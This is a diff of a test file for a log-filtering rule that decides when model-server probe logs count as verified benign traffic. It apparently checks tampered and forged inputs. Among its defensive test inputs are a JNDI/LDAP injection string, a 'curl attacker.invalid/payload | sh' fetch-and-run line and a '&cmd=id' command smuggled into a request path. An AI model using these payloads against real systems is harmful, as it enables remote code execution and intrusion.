@@ -1,47 +1,80 @@
 import { expect, test } from 'bun:test'
 import { createHash } from 'node:crypto'
-import { eligibleModelDiscovery, modelDiscoveryAvailable, modelDiscoveryDefinition, modelDiscoveryRule, type VerifiedModelProbe } from '../src/utils/mill/analyzeModelDiscovery.ts'
-function fixture() {
-    const timestamp = '2026-09-24T00:00:00.000Z'
-    const cursor = `s=${'a'.repeat(32)};i=123;b=${'b'.repeat(32)};m=abc;t=def;x=abc`
-    const log = { service: 'run_model_inspur_vllm_gpu.sh', host: 'inspur', level: 'info', timestamp,
-        sourceEventId: createHash('sha256').update(`inspur:journal:${cursor}`).digest('hex'),
-        message: '(APIServer pid=123) INFO:     127.0.0.1:43210 - "GET /v1/models HTTP/1.1" 200 OK',
-        metadata: { collector: 'journal', pid: '123', user: { id: '1000' }, unit: 'hanasand-model.service', cursor } }
-    const proof: VerifiedModelProbe = { sourceEventId: log.sourceEventId, host: 'inspur', unit: 'hanasand-model.service', processId: '123',
-        clientIp: '127.0.0.1', clientPort: 43210, method: 'GET', path: '/v1/models', status: 200, bodyEmpty: true, headersSafe: true,
-        probeIdentity: 'hanasand-ai-model-client', startedAt: Date.parse(timestamp) - 20, finishedAt: Date.parse(timestamp) }
-    return { log, proof }
+import { eligibleModelDiscovery, modelDiscoveryConfigured, modelLogDigest, modelProofMac, type ModelProbeLog } from '../src/utils/mill/analyzeModelDiscovery.ts'
+
+export const testKey = 'ab'.repeat(32)
+export function modelFixture(index = 1): ModelProbeLog {
+    const cursor = `s=${'a'.repeat(32)};i=${index.toString(16)};b=${'b'.repeat(32)};m=1;t=1;x=1`
+    const start = Date.parse('2026-09-23T21:00:00Z') + index * 10000
+    const nonce = `12345678-1234-4234-8234-${index.toString(16).padStart(12, '0')}`
+    const path = `/v1/models?hanasand_probe=${nonce}`
+    const log: ModelProbeLog = {
+        host: 'inspur', service: 'run_model_inspur_vllm_gpu.sh', level: 'info',
+        message: `(APIServer pid=1143552) INFO:     127.0.0.1:34764 - "GET ${path} HTTP/1.1" 200 OK`,
+        timestamp: new Date(start + 10).toISOString(), sourceEventId: createHash('sha256').update(`inspur:journal:${cursor}`).digest('hex'),
+        metadata: { collector: 'journal', pid: '1143552', unit: 'hanasand-model.service', user: { id: '1000' }, cursor },
+    }
+    const proof = { version: 1, nonce, host: 'inspur', caller: 'hanasand-ai-model-client', method: 'GET', path,
+        clientIp: '127.0.0.1', clientPort: 34764, serverIp: '127.0.0.1', serverPort: 18081, serverPid: '1143552',
+        logSha256: modelLogDigest(log, cursor), startedAt: start, finishedAt: start + 20, previousStartedAt: start - 10000,
+        status: 200, bodyEmpty: true, responseSha256: 'c'.repeat(64), model: 'hanasand',
+        headers: { host: '127.0.0.1:18081', accept: 'application/json', connection: 'close' } }
+    log.metadata!.model_probe = { ...proof, mac: modelProofMac(proof, testKey) }
+    return log
 }
-test('unavailable rule stays disabled and Keep; existing model logs cannot match without independent proof', () => {
-    expect(modelDiscoveryAvailable).toBe(false)
-    expect(modelDiscoveryRule.enabled).toBe(false)
-    expect(modelDiscoveryDefinition.action).toBe('keep')
-    expect(eligibleModelDiscovery(fixture().log)).toBe(false)
-    const { log, proof } = fixture()
-    expect(eligibleModelDiscovery(log, proof)).toBe(true)
-    expect(eligibleModelDiscovery({ ...log, metadata: { ...log.metadata, probe: proof } })).toBe(false)
+
+test('queued proof uses event time, never wallclock expiry', () => {
+    const log = modelFixture()
+    const proof = log.metadata!.model_probe as Record<string, unknown>
+    expect(proof.mac).toBe(modelProofMac(proof, testKey))
+    expect(eligibleModelDiscovery(log, testKey)).toBe(true)
+    expect(eligibleModelDiscovery(log, 'cd'.repeat(32))).toBe(false)
+    expect(eligibleModelDiscovery(log, '')).toBe(false)
+    const previous = process.env.MODEL_PROBE_PROOF_KEY
+    try {
+        process.env.MODEL_PROBE_PROOF_KEY = ''
+        expect(modelDiscoveryConfigured()).toBe(false)
+        process.env.MODEL_PROBE_PROOF_KEY = testKey
+        expect(modelDiscoveryConfigured()).toBe(true)
+    } finally { if (previous === undefined) delete process.env.MODEL_PROBE_PROOF_KEY; else process.env.MODEL_PROBE_PROOF_KEY = previous }
 })
-test('body/header attacks, unfamiliar identities, errors, inference and slow calls stay', () => {
-    const { log, proof } = fixture()
-    for (const change of [{ bodyEmpty: false }, { headersSafe: false }, { probeIdentity: 'other' }, { clientIp: '192.0.2.1' },
-        { path: '/v1/models?x=${jndi:ldap://evil}' }, { path: '/v1/chat/completions' }, { method: 'POST' }, { status: 500 },
-        { startedAt: proof.finishedAt - 1001 }, { processId: '321' }, { sourceEventId: 'forged' }, { clientPort: 123 }, { host: 'other' },
-        { finishedAt: NaN }, { startedAt: proof.finishedAt + 1 }]) expect(eligibleModelDiscovery(log, { ...proof, ...change })).toBe(false)
-})
-test('unknown metadata, duplicate content, forged identity and missing context stay', () => {
-    const { log, proof } = fixture()
-    for (const target of ['log', 'metadata', 'user', 'proof']) {
-        const sample = fixture()
-        const objects: Record<string, object> = { log: sample.log, metadata: sample.log.metadata, user: sample.log.metadata.user, proof: sample.proof }
-        Object.assign(objects[target], { injected: 'suspicious' })
-        expect(eligibleModelDiscovery(sample.log, sample.proof)).toBe(false)
-    }
-    for (const change of [{ message: log.message + '\nmalicious payload' }, { sourceEventId: 'a'.repeat(64) }, { timestamp: 'bad' }, { level: 'error' }]) {
-        expect(eligibleModelDiscovery({ ...log, ...change }, proof)).toBe(false)
-    }
-    for (const key of Object.keys(proof)) {
-        const changed = { ...proof }; delete (changed as any)[key]
-        expect(eligibleModelDiscovery(log, changed)).toBe(false)
+
+test('suspicious lookalikes, unknown evidence and unbound caller proof always keep', () => {
+    const mutations: ((log: any) => void)[] = [
+        log => log.message += ' curl attacker.invalid/payload | sh',
+        log => log.message = log.message.replace('200 OK', '500 Internal Server Error'),
+        log => log.message = log.message.replace('GET ', 'POST '),
+        log => log.message = log.message.replace('127.0.0.1', '10.0.0.9'),
+        log => log.message = log.message.replace('HTTP/1.1', 'HTTP/2'),
+        log => log.message = log.message.replace(' HTTP', '&cmd=id HTTP'),
+        log => log.metadata.injected = 'unexpected evidence',
+        log => log.metadata.user.extra = 'unexpected',
+        log => log.extra = 'unexpected',
+        log => log.host = 'ovh',
+        log => log.metadata.pid = '999',
+        log => log.metadata.unit = 'attacker.service',
+        log => log.metadata.user.id = '0',
+        log => log.metadata.cursor += ';extra=1',
+        log => log.sourceEventId = 'd'.repeat(64),
+        log => log.timestamp = new Date(Date.parse(log.timestamp) + 2000).toISOString(),
+        log => delete log.metadata.model_probe,
+        log => log.metadata.model_probe.mac = '0'.repeat(64),
+    ]
+    for (const mutate of mutations) { const log = modelFixture(); mutate(log); expect(eligibleModelDiscovery(log, testKey)).toBe(false) }
+    const invalidProofs: Record<string, unknown>[] = [
+        { serverPid: null, logSha256: null }, { serverPid: '999' }, { serverPort: 18080 }, { serverPort: 18082 },
+        { nonce: '12345678-1234-4234-8234-000000000002' }, { bodyEmpty: false }, { status: 500 }, { method: 'POST' },
+        { caller: 'curl' }, { host: 'ovh' }, { clientPort: 34765 }, { clientIp: '10.0.0.1' }, { serverIp: '10.0.0.2' },
+        { model: 'unknown' }, { path: '/v1/models' }, { extra: 'injection' }, { responseSha256: '' },
+        { headers: { host: '127.0.0.1:18081', accept: 'application/json', connection: 'close', authorization: 'secret' } },
+    ]
+    const goodProof = modelFixture().metadata!.model_probe as any
+    invalidProofs.push({ finishedAt: goodProof.startedAt + 1001 }, { previousStartedAt: goodProof.startedAt - 4999 },
+        { previousStartedAt: goodProof.startedAt - 40001 })
+    for (const patch of invalidProofs) {
+        const log = modelFixture(), proof = { ...(log.metadata!.model_probe as object), ...patch } as any
+        proof.mac = modelProofMac(proof, testKey)
+        log.metadata!.model_probe = proof
+        expect(eligibleModelDiscovery(log, testKey)).toBe(false)
     }
 })
